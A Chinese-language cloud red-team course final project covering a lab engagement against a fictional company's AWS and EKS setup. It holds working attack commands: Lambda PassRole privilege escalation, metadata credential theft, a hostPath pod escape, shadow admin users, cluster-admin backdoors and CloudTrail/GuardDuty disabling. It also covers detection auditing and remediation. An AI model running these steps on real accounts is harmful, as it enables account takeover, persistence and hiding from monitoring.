# Final Project — 完整雲端紅隊 Engagement

> **目標**：整合本課 Parts 0–7 的核心概念，在授權的 vulnerable lab 環境裡跑完一次完整的雲端紅隊 kill chain——從初始偵察、IAM 提權、服務攻擊、K8s 淪陷、持久化、防禦規避，到最後撰寫一份專業格式的 engagement report。完成後你不只「看過」這些技術，你「做過」了。

---

## 背景：模擬委託

**委託方**：MegaScale Corp（虛構）
**委託類型**：White-box 黑盒測試（Black-box with scoping call）
**委託日期**：2026-08-01
**授權窗口**：14 天（含報告撰寫）
**主要聯絡人**：資安長 (CISO) Alice Wu

**範圍（In-Scope）**：

- AWS 帳號 ID：`123456789012`（實際操作換成你自己的 lab 帳號）
- 目標服務：IAM、EC2、Lambda、S3、EKS cluster `megascale-prod`、ECR、Secrets Manager、RDS snapshot
- EKS 版本：1.29，Namespace `default` 與 `staging`
- 初始憑證：一組低權限 IAM user（`pentest-readonly`），模擬外洩的 access key 場景

**範圍外（Out-of-Scope）**：

- 任何生產資料庫的寫入或刪除
- DoS / 壓力測試
- 帳號以外的任何 AWS 資源（不能橫跳到不屬於測試帳號的 resource）
- 在真實 GuardDuty 告警觸發後不停手、繼續攻擊（本課所有操作都在你自己的 lab，但養成習慣）

**特別說明**：本 final project 所有技術都只能在你**自己控制**的 lab 環境執行。CloudGoat/kube-goat/Terraform vulnerable lab 是設計用來被打的——但不代表你可以拿這些技術去打別人的環境。

---

## 環境選項

### 選項 A：CloudGoat（Rhino Security Labs）

**定位**：Terraform 建出一堆故意設錯的 AWS 資源，每個 scenario 就是一個 privesc 迷宮。這是本 final project **最推薦**的選項，因為它測的攻擊路徑和本課 Parts 1–2 幾乎一一對應。

**安裝步驟**：

```bash
# 前提：Python 3.8+、Terraform >= 1.0、AWS CLI v2 設好 admin 憑證
pip install cloudgoat

# 設定你的 IP（CloudGoat 只允許你的 IP 存取某些資源）
cloudgoat config profile default

# 建立第一個 scenario
cloudgoat create iam_privesc_by_rollback
# Terraform apply 會輸出初始 access key，記下來當攻擊起點
```

**推薦跑的 scenario**（對應本課章節）：

| Scenario | 對應章節 | 攻擊核心 |
|---|---|---|
| `iam_privesc_by_rollback` | Ch 7 | 找舊版 policy，rollback 到含 admin 的版本 |
| `cloud_breach_s3` | Ch 6, 9, 10 | SSRF → EC2 metadata → S3 pivoting |
| `ecs_takeover` | Ch 11, 14 | ECS task role 過度權限 → 持久化 |
| `codebuild_secrets` | Ch 31 | CI/CD pipeline secrets 外洩 |
| `rce_web_app` | Ch 10, 7 | Web app RCE → metadata → IAM 提權 |

**快速建 vulnerable IAM 場景**：

```bash
# 如果你只想跑 IAM 提權，不想等完整 scenario
cloudgoat create iam_privesc_by_attachment
# 這個 scenario 給你一個有 iam:AttachRolePolicy 的 user
# 目標：把 AdministratorAccess 附到自己身上
```

**清理**（每次打完後）：

```bash
cloudgoat destroy iam_privesc_by_rollback
```

成本警示：CloudGoat 建出的資源會產生費用。每個 scenario 跑完立刻 destroy，不要讓它跑一整晚。`iam_privesc_by_rollback` 大約跑 2–4 小時、費用 < $1 USD。

---

### 選項 B：kube-goat

**定位**：一個充滿故意設錯的 K8s 叢集，部署在 minikube 上。本課 Part 4–5 的 K8s 攻擊鏈可以在這裡完整跑一遍，不需要 AWS 帳號。

**安裝步驟**：

```bash
# 前提：minikube、kubectl、Helm 已裝
minikube start --driver=docker --cpus=4 --memory=8192

# 拉 kube-goat
git clone https://github.com/ine-labs/kube-goat
cd kube-goat

# 一鍵建出所有 vulnerable workload
bash setup.sh
# 等 3–5 分鐘，建出 ~15 個 vulnerable deployment

# 確認 Pod 都起來了
kubectl get pods -A
```

**推薦跑的場景**：

- `metadata-db`：從 Pod 裡打 metadata endpoint（模擬 SSRF 鏈）
- `hidden-in-layers`：image layer 裡藏 secret（對應 Ch 19）
- `health-check`：command injection → container escape（對應 Ch 17）
- `system-monitor`：privileged Pod → hostPath → node escape（對應 Ch 27）

**本地快速驗證**（不需要 minikube，用 kind）：

```bash
kind create cluster --name kube-goat
kubectl apply -f https://raw.githubusercontent.com/ine-labs/kube-goat/master/kube-goat-deployment.yaml
```

---

### 選項 C：自建 Terraform Vulnerable Lab

**定位**：如果你想完全控制每個「錯誤」的設定、並對應到課程章節，自建是最好的選擇。下面是一個最小化的 Terraform 範例，建出三個核心錯誤點。

**最小 vulnerable lab（`main.tf`）**：

```hcl
terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
  }
}

provider "aws" {
  region = "us-east-1"
}

# =============================================
# 錯誤一：S3 bucket 關閉了 public access block
# 對應 Ch 9
# =============================================
resource "aws_s3_bucket" "vuln_bucket" {
  bucket        = "megascale-vuln-lab-${random_id.suffix.hex}"
  force_destroy = true
}

resource "aws_s3_bucket_public_access_block" "vuln_bucket_pab" {
  bucket = aws_s3_bucket.vuln_bucket.id

  block_public_acls       = false  # 故意設 false
  block_public_policy     = false  # 故意設 false
  ignore_public_acls      = false
  restrict_public_buckets = false
}

resource "aws_s3_bucket_policy" "vuln_bucket_policy" {
  bucket = aws_s3_bucket.vuln_bucket.id
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect    = "Allow"
      Principal = "*"               # 故意開公開讀
      Action    = ["s3:GetObject"]
      Resource  = "${aws_s3_bucket.vuln_bucket.arn}/*"
    }]
  })
  depends_on = [aws_s3_bucket_public_access_block.vuln_bucket_pab]
}

# =============================================
# 錯誤二：過度權限的 IAM Role
# 對應 Ch 7（PassRole 路徑）
# =============================================
resource "aws_iam_role" "overprivileged_role" {
  name = "megascale-overprivileged-role"
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect    = "Allow"
      Principal = { Service = "ec2.amazonaws.com" }
      Action    = "sts:AssumeRole"
    }]
  })
}

resource "aws_iam_role_policy" "overprivileged_policy" {
  name = "overprivileged-inline"
  role = aws_iam_role.overprivileged_role.id
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect   = "Allow"
        Action   = ["iam:PassRole", "iam:CreateRole", "iam:AttachRolePolicy"]
        Resource = "*"   # 故意不鎖 resource
      },
      {
        Effect   = "Allow"
        Action   = ["lambda:CreateFunction", "lambda:InvokeFunction"]
        Resource = "*"
      }
    ]
  })
}

# =============================================
# 錯誤三：CloudTrail 沒開（沒日誌）
# 對應 Ch 15、Ch 36
# =============================================
# 這個 lab 故意不建 aws_cloudtrail resource
# 用來練習：在沒日誌保護的帳號裡，
# 你的動作完全不會被 CloudTrail 記錄到 S3

resource "random_id" "suffix" {
  byte_length = 4
}

output "vuln_bucket_name" {
  value = aws_s3_bucket.vuln_bucket.bucket
}

output "overprivileged_role_arn" {
  value = aws_iam_role.overprivileged_role.arn
}
```

**用 Terraform workspace 隔離**（防止你的 lab 和其他環境設定混在一起）：

```bash
# 建立獨立的 lab workspace
terraform workspace new vuln-lab
terraform workspace select vuln-lab

# 套用
terraform init
terraform apply -auto-approve

# 打完後清掉，一個指令全刪
terraform destroy -auto-approve

# 確認回到 default workspace
terraform workspace select default
```

重要：把這個 Terraform 跑在**完全隔離的測試 AWS 帳號**，不要和任何生產帳號共用。`S3 public` 加上沒有 CloudTrail，如果帳號暴露了，你真的不會知道。

---

## 任務地圖：Kill Chain

完整的雲端紅隊 kill chain，從一組洩漏的低權限 access key 打到全帳號淪陷：

```
┌──────────────────────────────────────────────────────────────────┐
│                MegaScale Corp — Red Team Kill Chain               │
└──────────────────────────────────────────────────────────────────┘

[1] 初始存取（Initial Access）
    Pacu / ScoutSuite 偵察 → 找公開 S3 bucket
    找洩漏的 access key（GitHub dork / 環境變數）
    找可 SSRF 的 metadata endpoint
           │
           ▼
[2] IAM 提權（Privilege Escalation）
    enumerate-iam → 列出所有有效 permission
    找 PassRole / AttachRolePolicy / CreateFunction 路徑
    Lambda 提權：建 function → invoke → 取得 admin token
    目標：AdministratorAccess
           │
           ▼
[3] 橫向移動：服務攻擊（Lateral Movement）
    EC2 metadata SSRF → IMDSv1 偷 instance role token
    用 instance role → 找 EKS cluster → 取 kubeconfig
    aws eks get-token → 進 K8s control plane
           │
           ▼
[4] K8s 攻擊（K8s Takeover）
    列舉 ServiceAccount token → kubectl auth can-i --list
    找危險 verb（create pods、get secrets）
    hostPath Pod 逃逸 → 讀 node 的 /etc/kubernetes/pki
    取得 cluster-admin 憑證
           │
           ▼
[5] Cloud IAM 交會（Cloud–K8s Pivot）
    node IAM role（IRSA）→ AWS admin
    建 shadow IAM user → 安裝後門
    持久化：惡意 admission webhook / 過期日超長的 access key
           │
           ▼
[6] 防禦規避（Defense Evasion）
    StopLogging → 關掉 CloudTrail（只在授權 lab 做）
    GuardDuty findings suppression rule
    清 EventBridge rule（讓告警不通知）
           │
           ▼
[7] 資料外洩模擬（Exfiltration）
    列舉 RDS snapshot → 複製到攻擊者帳號（模擬）
    存取 S3 敏感 bucket → 下載設定檔
    Secrets Manager → 讀 DB 密碼 / API key
```

每一步驟以下展開具體指令。

---

## 步驟一：偵察與初始存取

### 工具初始化

```bash
# 設定洩漏的低權限憑證（從 CloudGoat output 拿到的）
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_DEFAULT_REGION=us-east-1

# 確認身份
aws sts get-caller-identity
# 輸出範例：
# { "UserId": "AIDA...", "Account": "123456789012",
#   "Arn": "arn:aws:iam::123456789012:user/pentest-readonly" }
```

### ScoutSuite：全帳號設定掃描

```bash
# ScoutSuite：掃所有服務的 misconfig，輸出 HTML 報告
scout aws --report-dir ./scoutsuite-report

# 打開報告，看 dashboard 的 danger 項目
# 重點看：IAM > Users without MFA、S3 > Public Buckets、
#         EC2 > Security Groups open to 0.0.0.0/0
```

ScoutSuite 跑完大約 5–15 分鐘，取決於帳號資源量。它用的是 AWS read-only API call（`list*`、`describe*`、`get*`），不會改動任何資源。

### Pacu：互動式 AWS 攻擊框架

```bash
# 啟動 Pacu（已裝）
pacu

# 在 Pacu session 裡
Pacu> import_keys --access-key-id AKIA... --secret-access-key ...
Pacu> whoami

# 枚舉所有服務暴露面
Pacu> run aws__enum_account
# 這個模組跑：IAM、EC2、S3、Lambda、EKS、RDS 的 list API

# 找公開 S3 bucket
Pacu> run aws__s3__enum_bucket_permissions
```

### Prowler：合規與安全基線掃描

```bash
# Prowler：跑 CIS AWS Foundations Benchmark
prowler aws --checks cis_level1_aws \
    --output-formats json html \
    --output-directory ./prowler-report

# 也可以只掃 IAM
prowler aws --service iam

# Finding 格式：FAIL/PASS，每條對應 CIS 編號
# 找 FAIL 項目 → 這是後續攻擊的切入點
```

### GitHub Dork：找洩漏的 access key

**本段未實測，為理論預期行為。**  
在真實 engagement 裡，你會在 GitHub 搜尋目標公司的 access key pattern。自驗方法：在你自己的測試 repo 故意 commit 一個假的 access key，然後用 truffleHog 掃出來。

```bash
# truffleHog：掃 Git repo 歷史裡的 secret
trufflehog github \
    --org megascalecorp \
    --token $GITHUB_TOKEN \
    --only-verified

# 或掃本地 clone 的 repo
trufflehog git file:///path/to/repo
```

---

## 步驟二：IAM 提權

### enumerate-iam：暴力測試所有 permission

```bash
# enumerate-iam 對現有憑證暴力呼叫每個 API，找出哪些 action 有效
git clone https://github.com/andresriancho/enumerate-iam
cd enumerate-iam

python3 enumerate-iam.py \
    --access-key $AWS_ACCESS_KEY_ID \
    --secret-key $AWS_SECRET_ACCESS_KEY \
    --region us-east-1 \
    2>/dev/null | tee enum-iam-output.txt

# 重點找這些 action（高風險）：
# iam:PassRole → 可以把 role 傳給 Lambda/EC2，間接執行
# iam:CreateFunction → 搭配 PassRole 的提權路徑
# iam:AttachRolePolicy → 直接附 AdministratorAccess
# iam:CreatePolicyVersion → rollback 到舊版 policy
```

### Pacu：自動化 PassRole 提權

```bash
# 在 Pacu 裡跑 privesc 模組（它會自動找可行路徑）
Pacu> run aws__privesc__scan
# 輸出：找到可行路徑 → PassRole → Lambda

# 執行 Lambda 提權
Pacu> run aws__privesc__lambda
# Pacu 自動建一個 Lambda function，role 設成 target admin role，
# invoke 後取回 admin 憑證
```

### 手動 Lambda 提權鏈（PassRole 路徑）

```bash
# 假設 enumerate-iam 找到了 iam:PassRole + lambda:CreateFunction

# 建 Lambda function（角色用我們想竊取的 admin role）
ADMIN_ROLE_ARN="arn:aws:iam::123456789012:role/megascale-admin-role"

cat > /tmp/exfil_lambda.py << 'EOF'
import boto3, json

def handler(event, context):
    sts = boto3.client('sts')
    identity = sts.get_caller_identity()
    creds = boto3.Session().get_credentials().get_frozen_credentials()
    return {
        'identity': identity,
        'access_key': creds.access_key,
        'secret_key': creds.secret_key,
        'token': creds.token
    }
EOF

# 打包
zip /tmp/exfil_lambda.zip /tmp/exfil_lambda.py

# 建 function，role 設成 admin role（這就是 PassRole 的本質）
aws lambda create-function \
    --function-name megascale-pentest-$(date +%s) \
    --runtime python3.12 \
    --role "$ADMIN_ROLE_ARN" \
    --handler exfil_lambda.handler \
    --zip-file fileb:///tmp/exfil_lambda.zip

# Invoke
aws lambda invoke \
    --function-name megascale-pentest-... \
    --payload '{}' \
    /tmp/lambda-output.json

# 取得 admin 臨時憑證
cat /tmp/lambda-output.json
# 輸出：{ "access_key": "ASIA...", "secret_key": "...", "token": "..." }

# 設定新憑證
export AWS_ACCESS_KEY_ID=$(jq -r '.access_key' /tmp/lambda-output.json)
export AWS_SECRET_ACCESS_KEY=$(jq -r '.secret_key' /tmp/lambda-output.json)
export AWS_SESSION_TOKEN=$(jq -r '.token' /tmp/lambda-output.json)

# 驗證
aws sts get-caller-identity
# 現在應該是 admin role 的身份
```

---

## 步驟三：服務攻擊（SSRF → metadata → 進 EKS）

### IMDSv1 SSRF 攻擊

**本段未實測，為理論預期行為。**  
前提：找到一個有 SSRF 漏洞的 web app 跑在 EC2 上，且 metadata endpoint 是 IMDSv1（沒有要求 PUT 拿 token）。自驗方法：在你自己的 EC2 instance 上把 IMDSv2 改回 IMDSv1 後測試。

```bash
# 直接打 metadata endpoint（如果你在 EC2 instance 上）
curl http://169.254.169.254/latest/meta-data/

# 取 instance role 名稱（169.254.169.254 是固定 IP，不是 magic number，
# 這是 AWS link-local metadata 服務的保留位址）
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 假設回傳 role 名稱是 megascale-ec2-role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/megascale-ec2-role
# 回傳 JSON：AccessKeyId、SecretAccessKey、Token（臨時憑證）

# 透過 SSRF 打（如果是 web app 的 SSRF，URL 換成：
# http://vuln-app.megascale.com/fetch?url=http://169.254.169.254/...）
```

### 從 instance role 進 EKS

```bash
# 設定 EC2 instance role 的憑證
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# 列出 EKS cluster
aws eks list-clusters
# 輸出：{ "clusters": ["megascale-prod"] }

# 更新 kubeconfig（這步需要 eks:DescribeCluster 權限）
aws eks update-kubeconfig \
    --name megascale-prod \
    --region us-east-1

# 驗證 K8s 存取
kubectl auth can-i --list
```

`aws eks update-kubeconfig` 實際上呼叫了 `eks:DescribeCluster` 和 `eks:GetToken`，並把 kubeconfig 寫入 `~/.kube/config`。如果 instance role 只有 `eks:DescribeCluster` 而沒有 K8s RBAC 綁定，你進得去 API server 但什麼都不能做——這就是為什麼 Ch 28 強調 node IAM role 和 K8s RBAC 必須分開控制。

---

## 步驟四：K8s 攻擊鏈

### 列舉 ServiceAccount 與 RBAC

```bash
# 列出現有 ServiceAccount
kubectl get sa -A

# 列出所有 ClusterRoleBinding（找誰有 cluster-admin）
kubectl get clusterrolebinding -o wide

# 列出目前 SA 能做什麼
kubectl auth can-i --list --namespace default

# 找危險 verb 組合：
# create pods → 可以建 privileged pod → 逃逸
# get secrets → 可以讀其他 SA 的 token
# impersonate → 可以冒充任意 user
# bind/escalate → 可以把 cluster-admin 綁到自己身上
```

### 竊取其他 ServiceAccount Token

```bash
# 找 namespace 裡所有 secret（包含 SA token）
kubectl get secret -n kube-system

# 拿 default SA token（如果 RBAC 讓你 get secret）
SA_SECRET=$(kubectl get secret -n kube-system \
    -o jsonpath='{.items[?(@.type=="kubernetes.io/service-account-token")].metadata.name}' \
    | tr ' ' '\n' | head -1)

kubectl get secret $SA_SECRET -n kube-system \
    -o jsonpath='{.data.token}' | base64 -d > /tmp/stolen-token.txt

# 用竊取的 token 執行指令
kubectl --token=$(cat /tmp/stolen-token.txt) auth can-i --list
```

### Pod 逃逸到 Node（hostPath 攻擊）

```bash
# 建一個逃逸用的 Pod：掛載 host root filesystem
cat << 'EOF' > /tmp/escape-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
  namespace: default
spec:
  hostPID: true        # 共用 host PID namespace
  hostNetwork: true    # 共用 host network
  containers:
  - name: escape
    image: ubuntu:22.04
    command: ["/bin/bash", "-c", "sleep 3600"]
    securityContext:
      privileged: true    # 這個就是 Ch 17 說的 privileged container
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /           # 掛載 host 整個 root filesystem
  nodeSelector:
    kubernetes.io/os: linux
EOF

kubectl apply -f /tmp/escape-pod.yaml
kubectl wait --for=condition=Ready pod/escape-pod --timeout=60s

# 進 Pod，從 /host 讀 node 的 root filesystem
kubectl exec -it escape-pod -- bash

# 以下在 Pod 內執行
chroot /host         # 切換 root 到 host filesystem
id                   # 確認是 root
# 現在你在 node 上

# 讀 node 的 kubeconfig（EKS 節點上通常有 bootstrap 憑證）
cat /etc/kubernetes/bootstrap-kubelet.conf
# 或讀 kubelet 的 client cert
ls /var/lib/kubelet/pki/
```

---

## 步驟五：持久化

**重要**：以下所有指令只能在 CloudGoat 或你自己的 Terraform lab 帳號執行，絕對不能在任何非授權環境使用。

### 建 Shadow IAM User

```bash
# 建一個隱蔽的 IAM user，名稱貼近現有服務帳號
aws iam create-user --user-name aws-service-monitor-backup

# 附 AdministratorAccess
aws iam attach-user-policy \
    --user-name aws-service-monitor-backup \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 建 access key（這就是後門）
aws iam create-access-key \
    --user-name aws-service-monitor-backup
# 記下輸出的 AccessKeyId 和 SecretAccessKey

# 設 console 密碼（讓這個帳號也能登入 AWS Console）
aws iam create-login-profile \
    --user-name aws-service-monitor-backup \
    --password "P@ssw0rd-$(date +%s)" \
    --no-password-reset-required
```

### K8s 持久化：ClusterRoleBinding 後門

```bash
# 建一個綁到 cluster-admin 的 ClusterRoleBinding，
# 主體是攻擊者控制的 ServiceAccount
cat << 'EOF' | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: system:monitoring-agent-binding   # 名稱刻意貼近系統元件
subjects:
- kind: ServiceAccount
  name: default
  namespace: monitoring     # 這個 namespace 正常情況下沒人在看
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
EOF
```

### 清理痕跡（模擬）

```bash
# 停止 CloudTrail logging（只在授權 lab，這在真實環境是重大告警）
TRAIL_NAME=$(aws cloudtrail list-trails \
    --query 'Trails[0].TrailARN' --output text)

aws cloudtrail stop-logging --name "$TRAIL_NAME"
# 注意：這個動作本身已經被 CloudTrail 記下了（race condition）

# GuardDuty suppression rule（讓後續動作不產生 finding）
DETECTOR_ID=$(aws guardduty list-detectors \
    --query 'DetectorIds[0]' --output text)

aws guardduty create-filter \
    --detector-id "$DETECTOR_ID" \
    --name "pentest-suppress-all" \
    --action ARCHIVE \
    --finding-criteria '{"Criterion":{"service.action.actionType":{"Eq":["NETWORK_CONNECTION"]}}}'
```

---

## 步驟六：偵測自我稽核

這步很多紅隊會跳過，但它是整個 engagement 最有學習價值的部分——你反過來當 blue team，看自己有哪些動作被抓到了。

### 查 GuardDuty Findings

```bash
DETECTOR_ID=$(aws guardduty list-detectors \
    --query 'DetectorIds[0]' --output text)

# 列出所有 finding（預設只顯示未歸檔的）
aws guardduty list-findings \
    --detector-id "$DETECTOR_ID" \
    --query 'FindingIds' --output json

# 取 finding 詳情
aws guardduty get-findings \
    --detector-id "$DETECTOR_ID" \
    --finding-ids $(aws guardduty list-findings \
        --detector-id "$DETECTOR_ID" \
        --query 'FindingIds[0]' --output text)
```

**預期會出現的 finding 類型**（如果 GuardDuty 開著）：

- `Recon:IAMUser/MaliciousIPCaller`：從已知惡意 IP 呼叫 IAM API
- `PrivilegeEscalation:IAMUser/AdministrativePermissions`：突然取得 admin 權限
- `Persistence:IAMUser/UserPermissions`：建新 IAM user 並附 policy
- `UnauthorizedAccess:IAMUser/ConsoleLoginSuccess.B`：罕見地點登入 console
- `Stealth:IAMUser/CloudTrailLoggingDisabled`：停止 CloudTrail

### 查 CloudTrail 日誌

```bash
# 查最近 24 小時的 IAM 相關事件
aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=EventName,AttributeValue=CreateUser \
    --start-time $(date -d '24 hours ago' --iso-8601=seconds) \
    --query 'Events[].{Time:EventTime,User:Username,Event:EventName}'

# 查 StopLogging 事件（你剛才做的）
aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=EventName,AttributeValue=StopLogging

# 查 Lambda 建立事件（提權的痕跡）
aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=EventName,AttributeValue=CreateFunction20150331
```

### 查 Falco Alerts（K8s 端）

```bash
# 如果 lab 裡有跑 Falco（kube-goat 有預裝）
kubectl logs -n falco -l app=falco --tail=50

# 期望看到的 Falco rule 觸發：
# - "Terminal shell in container"（你 exec 進 Pod 的那一刻）
# - "Write below binary dir in container"
# - "Privileged container started"（escape-pod）
# - "Mount sensitive host paths"（hostPath /）
```

**記錄下哪些動作被抓到、哪些沒有被抓到**——這直接對應報告裡的 Detection Gap 分析。

---

## 步驟七：報告撰寫

報告是 engagement 的交付物核心。一份好的紅隊報告讓 CISO 在 15 分鐘內知道公司的風險，讓工程師在一週內知道怎麼修。

---

## 交付物規格：Engagement Report

### Executive Summary 範本

（給 CTO/CISO 看，150 字以內，零技術術語）

---

MegaScale Corp AWS 環境在本次授權評估（2026-08-01 至 2026-08-14）中被確認存在高嚴重性的安全風險鏈：評估團隊從一組洩漏的低權限 IAM 憑證出發，在 4 小時內取得 AWS 帳號的管理員權限，隨後橫向進入 EKS 生產叢集並取得 cluster-admin 控制權，最終能夠存取 Secrets Manager 中的所有資料庫憑證與 RDS 快照。共發現 5 項 Critical、3 項 High、4 項 Medium 等級漏洞。根本原因集中在三點：IAM 最小權限未落實、EC2 Metadata 服務未升級至 IMDSv2、K8s RBAC 過度授權。建議在 30 天內完成 Critical 項目的修補。

---

### Attack Narrative（攻擊敘事）

攻擊敘事用時間軸格式，讓防禦端能重建攻擊路徑：

| 時間（T+分鐘） | 行動 | 工具 | 結果 |
|---|---|---|---|
| T+0 | 取得初始憑證（模擬 GitHub 洩漏） | truffleHog | `pentest-readonly` IAM user |
| T+5 | 全帳號偵察 | ScoutSuite | 找到 3 個公開 S3 bucket、2 個無 MFA 的 IAM user |
| T+15 | IAM 權限枚舉 | enumerate-iam | 找到 `iam:PassRole`、`lambda:CreateFunction` |
| T+30 | Lambda 提權鏈 | Pacu | 取得 `AdministratorAccess` 臨時憑證 |
| T+45 | EC2 metadata SSRF | curl | 取得 EC2 instance role token |
| T+60 | 進入 EKS cluster | aws eks / kubectl | 以 `system:masters` 身份連入 |
| T+75 | K8s RBAC 枚舉 | kubectl auth can-i | 找到 `create pods` 與 `get secrets` |
| T+90 | hostPath Pod 逃逸 | kubectl apply | 取得節點 root 存取 |
| T+105 | 建 shadow IAM user | aws iam | 後門帳號植入 |
| T+120 | 存取 Secrets Manager | aws secretsmanager | 讀取 15 個生產 secret |
| T+125 | 停止 CloudTrail（模擬） | aws cloudtrail | 日誌中斷 7 分鐘 |

### Findings Table（發現表）

| Finding ID | 標題 | Severity | CVSS 3.1 | MITRE Technique | 影響 | 修補建議摘要 |
|---|---|---|---|---|---|---|
| F-001 | IAM PassRole 允許無限制 Lambda 提權 | Critical | 9.8 | T1078.004 Valid Accounts: Cloud Accounts | 從低權限用戶取得 AdministratorAccess | 限制 iam:PassRole 的 Resource 為特定 role ARN，移除 lambda:CreateFunction |
| F-002 | EC2 Metadata 服務未強制 IMDSv2 | Critical | 9.1 | T1552.005 Cloud Instance Metadata API | SSRF 漏洞可直接竊取 instance role 憑證 | 全帳號強制 IMDSv2：`aws ec2 modify-instance-metadata-options --http-tokens required` |
| F-003 | EKS node 使用 cluster-admin 等級 IAM role | Critical | 9.0 | T1548.005 Abuse Elevation Control Mechanism | 節點逃逸後直接取得全帳號 AWS 管理員權限 | 移除節點 IAM role 的 iam:* 和 ec2:* 廣域授權，改用 IRSA 最小權限 |
| F-004 | K8s 允許 default SA 建立 privileged Pod | Critical | 8.8 | T1610 Deploy Container | 任何可部署 Pod 的攻擊者能在節點上取得 root | 啟用 Pod Security Admission（restricted profile），禁止 privileged 和 hostPath |
| F-005 | S3 bucket 公開讀取且含敏感設定檔 | Critical | 8.6 | T1530 Data from Cloud Storage Object | 攻擊者無需認證即可下載 DB 連線字串 | 啟用 S3 Block Public Access（帳號層級），移除公開 bucket policy |
| F-006 | CloudTrail 未開啟多區域追蹤 | High | 7.5 | T1562.008 Disable Cloud Logs | 攻擊者在 us-west-2 的動作完全沒有日誌 | 啟用 multi-region CloudTrail，並將 trail 鎖定（S3 Object Lock） |
| F-007 | GuardDuty 啟用但未設 alert 通知 | High | 7.2 | T1562.006 Indicator Blocking | Finding 產生但無人收到通知，告警沉默 | 設定 GuardDuty → EventBridge → SNS → 通知 CISO |
| F-008 | IAM user 無 MFA 且有長效 access key | High | 7.0 | T1078.004 Valid Accounts: Cloud Accounts | 洩漏的 access key 直接可用，無需繞過 MFA | 強制所有 human IAM user 啟用 MFA，並設 SCP 拒絕無 MFA 的 API 呼叫 |

### 修補建議範本

每個 Critical finding 的具體步驟：

**F-001 修補（對應 Ch 7 / Ch 34）**：

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::123456789012:role/megascale-lambda-execution-role"
  }]
}
```

把 `Resource: "*"` 改成只允許特定 role ARN。同時加 `Condition: { "StringEquals": { "iam:PassedToService": "lambda.amazonaws.com" } }` 限制只能傳給 Lambda。

**F-002 修補（對應 Ch 5 / Ch 10）**：

```bash
# 批次把所有 EC2 instance 改成 IMDSv2 required
aws ec2 describe-instances \
    --query 'Reservations[].Instances[].InstanceId' \
    --output text | tr '\t' '\n' | while read id; do
    aws ec2 modify-instance-metadata-options \
        --instance-id "$id" \
        --http-tokens required \
        --http-endpoint enabled
done

# 帳號層級預設（新開 instance 自動 IMDSv2）
aws ec2 modify-instance-metadata-defaults \
    --http-tokens required
```

**F-003 修補（對應 Ch 28 / Ch 35）**：使用 IRSA（IAM Roles for Service Accounts），讓 K8s workload 的 IAM 權限與節點 IAM role 完全解耦。節點只需要 `AmazonEKSWorkerNodePolicy` 和 ECR 拉 image 的最小權限。

**F-004 修補（對應 Ch 35）**：

```bash
# 啟用 Pod Security Admission（K8s 1.25+）
kubectl label namespace default \
    pod-security.kubernetes.io/enforce=restricted \
    pod-security.kubernetes.io/audit=restricted \
    pod-security.kubernetes.io/warn=restricted
```

**F-005 修補（對應 Ch 9 / Ch 34）**：

```bash
# 帳號層級封鎖所有公開存取（一道防線封住 bucket policy 的漏洞）
aws s3control put-public-access-block \
    --account-id 123456789012 \
    --public-access-block-configuration \
    'BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true'
```

### 時間軸（Timeline）

| 日期 | 里程碑 |
|---|---|
| 2026-08-01 | Kickoff call，確認範圍、緊急聯絡窗口、法律文件簽署 |
| 2026-08-01 | 初始憑證取得，開始偵察（ScoutSuite、Prowler） |
| 2026-08-02 | IAM 提權完成，取得 AdministratorAccess |
| 2026-08-03 | EKS 攻擊鏈完成，cluster-admin 確認 |
| 2026-08-04 | 持久化植入，Secrets Manager 存取確認 |
| 2026-08-05 | 停止攻擊，開始偵測自我稽核 |
| 2026-08-06–08 | 報告草稿撰寫 |
| 2026-08-10 | 草稿交委託方，確認無誤 |
| 2026-08-14 | 最終報告交付，Debrief meeting |

---

## 報告範本（完整）

<details>
<summary>展開完整報告範本（填空版）</summary>

```markdown
# 雲端安全滲透測試報告
## [公司名稱] AWS + EKS 環境
**報告版本**：v1.0
**評估日期**：______ 至 ______
**報告日期**：______
**機密等級**：CONFIDENTIAL — 僅供 [公司名稱] 內部使用

---

## 1. Executive Summary

[公司名稱] 委託 [紅隊團隊名稱] 對其 AWS 帳號（ID：______）及 EKS 叢集
（名稱：______）進行為期 __ 天的授權安全評估。

### 整體風險評級：[Critical / High / Medium]

評估發現 __ 項 Critical、__ 項 High、__ 項 Medium 等級漏洞。
評估團隊在 [X] 小時內取得 AWS 管理員權限，並在 [Y] 小時內取得 K8s
cluster-admin 控制。

**前三大根本原因**：
1. [根本原因一]
2. [根本原因二]
3. [根本原因三]

**建議優先修補的三件事**：
1. [30 天內]：[行動]
2. [60 天內]：[行動]
3. [90 天內]：[行動]

---

## 2. 評估範圍與方法論

### 範圍

**In-Scope**：
- AWS 帳號 ID：______
- 服務：______
- EKS 叢集：______

**Out-of-Scope**：
- ______

### 方法論

本次評估遵循 PTES（Penetration Testing Execution Standard）框架，
參照 MITRE ATT&CK for Cloud 技術矩陣，分為以下階段：
1. 偵察（Reconnaissance）
2. 初始存取（Initial Access）
3. 提權（Privilege Escalation）
4. 橫向移動（Lateral Movement）
5. 持久化（Persistence）
6. 資料存取（Data Access）
7. 偵測規避（Defense Evasion）

---

## 3. 執行摘要：Attack Narrative

### 3.1 初始存取

